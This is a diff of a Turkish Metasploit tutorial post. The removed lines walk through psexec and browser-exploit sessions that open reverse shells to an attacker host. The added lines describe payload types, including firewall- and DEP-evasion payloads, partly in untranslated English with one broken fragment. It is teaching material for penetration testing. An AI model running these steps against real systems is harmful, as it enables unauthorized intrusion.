@@ -17,127 +17,64 @@ tags:
 excerpt:
 ---
 
-Metasploit Framework içerisinde tüm exploit modülleri **aktif** ve **pasif** olarak gruplandırılırlar.
+# Payload Grupları Nelerdir?
 
-# Aktif Exploit
+Payload, bir exploit modül türünü ifade eder. Metasploit Framework içerisinde 3 farklı grup payload modülü bulunur. Tekil, Sahneleyiciler ve Sahneler (Singles, Stagers ve Stages) olarak ayırabileceğimiz bu modüllere bakacağız. 
 
-Aktif exploitler, belirli bir hedef üzerinde çalışacak ve işlem tamamlanana kadar çalışmaya devam edecektir. Herhangi bir hata ile karşılaştığında çalışmayı durdururlar. 
+## Tekil payloadlar (Singles)
 
-Örneğin, Brute-force modülü hedef bilgisayarda bir shell komut satırı açılana kadar çalışır ve işlemi bitince durur. İşlemlerinin tamamlanması uzun zaman alabileceğinden ```-j``` parametresi kullanılarak arka plana gönderilebilirler.
+Bu tür payload modülleri, ihtiyaç duydukları bütün kodları ve işlemleri kendi bünyesinde barındırlar. Çalışmak için herhangi bir yardımcıya ihtiyaç duymazlar. Örneğin, hedef sisteme bir kullanıcı ekleyen payload, işlemini yapar ve durur. Başka bir komut satırına vb. ihtiyaç duymaz. 
 
-Aşağıdaki örnekte, ms08_067_netapi explotinin çalışmaya başlatılıp arka plana gönderildiğini görebilirsiniz. 
+Tek başlarına bir program olduklarında netcat vb. programlar tarafından fark edilip yakalanabilirler.
 
-```sh
-msf exploit(ms08_067_netapi) > exploit -j
-[*] Exploit running as background job.
-msf exploit(ms08_067_netapi) >
-``` 
+“windows/shell_bind_tcp” isimlendirmesine dikkat edelim. Windows için shell_bind_tcp tekil bir payload olarak çalışır. Bir sonraki bölümde farklı bir isimlendirme göreceğiz.
 
-**Örnek**
+, bütün . These different types allow for a great deal of versatility and can be useful across numerous types of scenarios. Whether or not a payload is staged, is represented by ‘/’ in the payload name. For example, “windows/shell_bind_tcp” is a single payload with no stage, whereas “windows/shell/bind_tcp” consists of a stager (bind_tcp) and a stage (shell).
 
-Bu örnekte, önceden keşif ile bilgileri elde edilen bir hedef bilgisayarın (192.168.1.100) gerekli değişkenleri ayarlanması ve çalışmaya başlaması görülmektedir. Hedef bilgisayarda _shell_ açmak için _psexec_ exploiti ve içerisinde reverse_tcp payload modülü kullanılmaktadır.
 
-```sh
-msf > use exploit/windows/smb/psexec
-msf exploit(psexec) > set RHOST 192.168.1.100
-RHOST => 192.168.1.100
-msf exploit(psexec) > set PAYLOAD windows/shell/reverse_tcp
-PAYLOAD => windows/shell/reverse_tcp
-msf exploit(psexec) > set LHOST 192.168.1.5
-LHOST => 192.168.1.5
-msf exploit(psexec) > set LPORT 4444
-LPORT => 4444
-msf exploit(psexec) > set SMBUSER victim
-SMBUSER => victim
-msf exploit(psexec) > set SMBPASS s3cr3t
-SMBPASS => s3cr3t
-msf exploit(psexec) > exploit
+## Sahneleyiciler (Stagers)
 
-[*] Connecting to the server...
-[*] Started reverse handler
-[*] Authenticating as user 'victim'...
-[*] Uploading payload...
-[*] Created \hikmEeEM.exe...
-[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.100[\svcctl] ...
-[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.100[\svcctl] ...
-[*] Obtaining a service manager handle...
-[*] Creating a new service (ciWyCVEp - "MXAVZsCqfRtZwScLdexnD")...
-[*] Closing service handle...
-[*] Opening service...
-[*] Starting the service...
-[*] Removing the service...
-[*] Closing service handle...
-[*] Deleting \hikmEeEM.exe...
-[*] Sending stage (240 bytes)
-[*] Command shell session 1 opened (192.168.1.5:4444 -> 192.168.1.100:1073)
 
-Microsoft Windows XP [Version 5.1.2600]
-(C) Copyright 1985-2001 Microsoft Corp.
+Sahneleyici payload modülleri, hedef bilgisayar ile yerel bilgisayar arasında ağ bağlantısı kuran kodlardır. Genellikle küçük kodlar barındırırlar. Çalışabilmek için bir sahneye ihtiyaç duyarlar. Metasploit Framework, en uygun olan payload modülünü kullanacak, başarılı olmaz ise daha az başarı vadeden payload otomatik olarak seçilecektir. 
 
-C:\WINDOWS\system32>
-```
+```windows/shell/bind_tcp``` isimlendirmesine dikkat edelim. Burada ```bind_tcp``` sahneleyicidir ve bir sahneye ihtiyaç duyar. İşte bu isimlendirmede, ```windows``` ile ```bind_tcp``` arasında bulunan ```shell``` sahneyi ifade etmektedir. 
 
-# Pasif Exploit
+## Sahneler (Stages)
 
-Pasif Exploitler, yerel bilgisayarda (kendi bilgisayarımız) pasif olarak çalışır ve dinlemede kalırlar. Hedef bilgisayarın bir şekilde yerel bilgisayara bağlanmasını beklerler. 
+Sahne olarak ifade ettiğimiz payload modül tipleri, sahneleyiciler tarafından kullanılırlar. Aracılık ettiklerinden ```windows/shell/bind_tcp``` isimlendirmesinde orta kısma yazılırlar. Herhangi bir boyut kısıtlamaları yoktur. Meterpreter, VNC Injection ve iPhone ‘ipwn’ Shell bunlara örnek olarak verilebilir.
 
-Pasif exploitler neredeyse her durumda Web tarayıcı, FTP vb. istemciler üzerine odaklanırlar. Eposta ile gönderilen dosyalar içerisinden bağlantılarda da kullanılabilirler. Pasif exploit çalıştığında beklemeye başlar. Ne zaman bir kullanıcı sitedeki linke tıklar veya bir işlme yapar, işte o zaman dinlemedeki pasif exploit sinyali alır ve hedefte bir **shell** açar. 
+# Payload Tipleri Nelerdir?
 
-Arka planda çalışan ve dinleme yapan exploitlerin listesini ```sessions``` komutuna ```-l``` parametresi vererek görebilirsiniz. Listeden istediğiniz ```ID``` numaralı işleme gitmek iiçin ```-i``` parametresini kullanabilirsiniz.
- 
-```sh
-msf exploit(ani_loadimage_chunksize) > sessions -l
+Yazının ilk bölümünde Payloadları 3 gruba ayırmıştık. Şimdi payloadları tiplerine göre inceleyelim.
 
-Active sessions
-===============
+## Inline (Non Staged)
 
-  Id  Description  Tunnel
-  --  -----------  ------
-  1   Meterpreter  192.168.1.5:52647 -> 192.168.1.100:4444
+Bu tür payloadlar, ihtiyaç duydukları sahneyi (shell) de kendi içlerinde bulundurduklarından daha stabil çalışırlar. Boyutları bir miktar büyük olduklarında karşı tarafın farketmesi de daha kolay olmaktadır. Bazı Exploitler, kısıtlamalarından dolayı bu payloadları kullanamayabilirler. 
 
-msf exploit(ani_loadimage_chunksize) > sessions -i 1
-[*] Starting interaction with 1...
+## Staged
 
-meterpreter >
-```
+Sahneleyiciler, karşı taraftan aldığı bir bilgiyi yine karşı tarafta çalıştırmak istediğinde kendisine sağlanan sahneyi (stage) kullanır. Bu tip payloadlara Sahlenen (Staged) adı verilmektedir. 
 
-**Örnek**
+## Meterpreter
 
-Aşağıdaki örnekte, loadimage_chunksize exploiti ve reverse_tcp payload u kullanılarak bir kullanıcının Web sayfasına girmesi beklenmeye başlanmaktadır.
-```LHOST``` değişkeni yerelde dinleme yapacak bilgisayar IP adresini, ```LPORT``` ise yerel bilgisayarda dinlenme yapacak port numarasını ifade eder. 
+Meterpreter, the short form of Meta-Interpreter is an advanced, multi-faceted payload that operates via dll injection. The Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques. Scripts and plugins can be loaded and unloaded dynamically as required and Meterpreter development is very strong and constantly evolving.
 
-```sh
-msf > use exploit/windows/browser/ani_loadimage_chunksize
-msf exploit(ani_loadimage_chunksize) > set URIPATH /
-URIPATH => /
-msf exploit(ani_loadimage_chunksize) > set PAYLOAD windows/shell/reverse_tcp
-PAYLOAD => windows/shell/reverse_tcp
-msf exploit(ani_loadimage_chunksize) > set LHOST 192.168.1.5
-LHOST => 192.168.1.5
-msf exploit(ani_loadimage_chunksize) > set LPORT 4444
-LPORT => 4444
-msf exploit(ani_loadimage_chunksize) > exploit
-[*] Exploit running as background job.
+## PassiveX
 
-[*] Started reverse handler
-[*] Using URL: http://0.0.0.0:8080/
-[*]  Local IP: http://192.168.1.5:8080/
-[*] Server started.
-msf exploit(ani_loadimage_chunksize) >
-[*] Attempting to exploit ani_loadimage_chunksize
-[*] Sending HTML page to 192.168.1.100:1077...
-[*] Attempting to exploit ani_loadimage_chunksize
-[*] Sending Windows ANI LoadAniIcon() Chunk Size Stack Overflow (HTTP) to 192.168.1.100:1077...
-[*] Sending stage (240 bytes)
-[*] Command shell session 2 opened (192.168.1.5:4444 -> 192.168.1.100:1078)
+PassiveX is a payload that can help in circumventing restrictive outbound firewalls. It does this by using an ActiveX control to create a hidden instance of Internet Explorer. Using the new ActiveX control, it communicates with the attacker via HTTP requests and responses.
 
-msf exploit(ani_loadimage_chunksize) > sessions -i 2
-[*] Starting interaction with 2...
+##NoNX
 
-Microsoft Windows XP [Version 5.1.2600]
-(C) Copyright 1985-2001 Microsoft Corp.
+The NX (No eXecute) bit is a feature built into some CPUs to prevent code from executing in certain areas of memory. In Windows, NX is implemented as Data Execution Prevention (DEP). The Metasploit NoNX payloads are designed to circumvent DEP.
 
-C:\Documents and Settings\victim\Desktop>
-```
+## Ord
 
-Anlatılmasını istediğiniz diğer başlıkları bize iletebilirsiniz.
+Ordinal payloads are Windows stager based payloads that have distinct advantages and disadvantages. The advantages being it works on every flavor and language of Windows dating back to Windows 9x without the explicit definition of a return address. They are also extremely tiny. However two very specific disadvantages make them not the default choice. The first being that it relies on the fact that ws2_32.dll is loaded in the process being exploited before exploitation. The second being that it’s a bit less stable than the other stagers.
+
+## IPv6
+
+The Metasploit IPv6 payloads, as the name indicates, are built to function over IPv6 networks.
+
+## Reflective DLL injection
+
+Reflective DLL Injection is a technique whereby a stage payload is injected into a compromised host process running in memory, never touching the host hard drive. The VNC and Meterpreter payloads both make use of reflective DLL injection. You can read more about this from Stephen Fewer, the creator of the reflective DLL injection method.
